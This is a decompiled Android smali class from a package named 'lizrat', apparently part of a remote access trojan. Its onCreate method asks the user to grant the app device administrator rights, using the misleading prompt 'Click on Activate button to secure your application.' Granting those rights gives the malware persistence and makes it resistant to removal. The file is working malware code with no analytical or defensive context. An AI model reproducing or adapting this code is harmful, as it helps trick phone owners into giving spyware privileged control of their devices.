.class public LLiz0rd/lizrat/activityadm;
.super Landroid/app/Activity;
.source "activityadm.java"


# static fields
.field private static final REQUEST_CODE:I


# instance fields
.field private mAdminName:Landroid/content/ComponentName;

.field private mDPM:Landroid/app/admin/DevicePolicyManager;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 11
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    .line 17
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 20
    :try_start_0
    invoke-virtual {p0}, LLiz0rd/lizrat/activityadm;->getApplicationContext()Landroid/content/Context;

    const-string p1, "device_policy"

    invoke-virtual {p0, p1}, LLiz0rd/lizrat/activityadm;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/admin/DevicePolicyManager;

    iput-object p1, p0, LLiz0rd/lizrat/activityadm;->mDPM:Landroid/app/admin/DevicePolicyManager;

    .line 22
    new-instance p1, Landroid/content/ComponentName;

    const-class v0, LLiz0rd/lizrat/AdminReciver;

    invoke-direct {p1, p0, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object p1, p0, LLiz0rd/lizrat/activityadm;->mAdminName:Landroid/content/ComponentName;

    .line 23
    iget-object v0, p0, LLiz0rd/lizrat/activityadm;->mDPM:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v0, p1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 25
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v0, "android.app.extra.DEVICE_ADMIN"

    .line 26
    iget-object v1, p0, LLiz0rd/lizrat/activityadm;->mAdminName:Landroid/content/ComponentName;

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string v0, "android.app.extra.ADD_EXPLANATION"

    const-string v1, "Click on Activate button to secure your application."

    .line 27
    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v0, 0x0

    .line 28
    invoke-virtual {p0, p1, v0}, LLiz0rd/lizrat/activityadm;->startActivityForResult(Landroid/content/Intent;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 33
    :catch_0
    :cond_0
    invoke-virtual {p0}, LLiz0rd/lizrat/activityadm;->finish()V

    return-void
.end method
